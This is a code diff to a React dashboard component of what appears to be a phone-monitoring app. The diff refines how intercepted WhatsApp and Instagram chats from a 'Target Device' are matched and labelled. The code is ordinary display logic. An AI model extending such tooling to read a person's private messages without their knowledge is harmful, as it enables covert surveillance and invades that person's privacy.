@@ -1014,15 +1014,24 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
             if ((m as any).chat_name) {
               const msgChat = String((m as any).chat_name).trim().toLowerCase();
               const currChat = currentChatName.trim().toLowerCase();
-              if (msgChat !== currChat) {
-                return false;
+              if (isInstagram) {
+                // For Instagram, strip leading @, handle usernames vs display names, and status suffixes
+                const cleanMsgChat = msgChat.replace(/^@/, "").replace(/\s+(active.*|seen.*|typing.*)$/i, "").trim();
+                const cleanCurrChat = currChat.replace(/^@/, "").replace(/\s+(active.*|seen.*|typing.*)$/i, "").trim();
+                if (cleanMsgChat !== cleanCurrChat && !cleanMsgChat.includes(cleanCurrChat) && !cleanCurrChat.includes(cleanMsgChat)) {
+                  return false;
+                }
+              } else {
+                if (msgChat !== currChat) {
+                  return false;
+                }
               }
             }
 
-            // If sender has "Sender @ GroupName", ensure it matches the current group
-            if (m.sender && /@/.test(m.sender)) {
+            // If sender has "Sender @ GroupName", ensure it matches the current group (WhatsApp ONLY)
+            if (!isInstagram && m.sender && /@/.test(m.sender)) {
               const parts = m.sender.split(/\s*@\s*/);
-              if (parts.length > 1) {
+              if (parts.length > 1 && parts[0].trim().length > 0) {
                 const groupPart = parts[1].trim().toLowerCase();
                 const currChat = currentChatName.trim().toLowerCase();
                 if (groupPart && groupPart !== currChat) {
@@ -1056,9 +1065,16 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
               cleanText.toLowerCase().includes("photo");
 
             const rawSender = m.sender || currentChatName;
-            const cleanSender = isTargetSent
-              ? "Target Device"
-              : (rawSender.includes("@") ? rawSender.split(/\s*@\s*/)[0].trim() : rawSender);
+            let cleanSender: string;
+            if (isTargetSent) {
+              cleanSender = "Target Device";
+            } else if (isInstagram) {
+              cleanSender = rawSender.startsWith("@") ? rawSender : (rawSender ? `@${rawSender.replace(/^@/, "")}` : currentChatName);
+            } else {
+              cleanSender = (rawSender.includes("@") && !rawSender.startsWith("@"))
+                ? rawSender.split(/\s*@\s*/)[0].trim()
+                : rawSender;
+            }
 
             return {
               id: m.id,
@@ -1081,13 +1097,19 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
 
           // Background auto-sync / live polling: update only if new messages or changes exist
           setActiveThreadMessages((prev) => {
+            // Replace synthetic preview message if real messages have arrived
+            const isOnlyPreview = prev.length === 1 && String(prev[0].id).startsWith("preview-");
+            if (isOnlyPreview && unified.length > 0) {
+              return unified;
+            }
+
             if (unified.length === 0 && prev.length > 0) return prev;
             if (prev.length === 0) return unified;
             if (prev.length === unified.length) {
               let isIdentical = true;
               for (let i = 0; i < prev.length; i++) {
                 if (
-                  prev[i].id !== unified[i].id ||
+                  String(prev[i].id) !== String(unified[i].id) ||
                   prev[i].text !== unified[i].text ||
                   prev[i].isOutgoing !== unified[i].isOutgoing ||
                   prev[i].mediaPath !== unified[i].mediaPath ||
@@ -2603,7 +2625,13 @@ export default function AppsCard({ deviceId }: { deviceId: string }) {
                                           <span className="truncate">
                                             {isTargetSent
                                               ? "Sent by Target (Monitored Phone)"
-                                              : `Received from: ${(m.sender || selectedChatSummary.chatName).split(/\s*@\s*/)[0].trim()}`}
+                                              : `Received from: ${
+                                                  isInstagramMsg
+                                                    ? (m.sender || selectedChatSummary?.chatName || "Contact")
+                                                    : (m.sender || selectedChatSummary?.chatName || "")
+                                                        .split(/\s*@\s*/)[0]
+                                                        .trim() || selectedChatSummary?.chatName || "Contact"
+                                                }`}
                                           </span>
                                         </span>
                                         <div className="flex items-center gap-1 shrink-0">
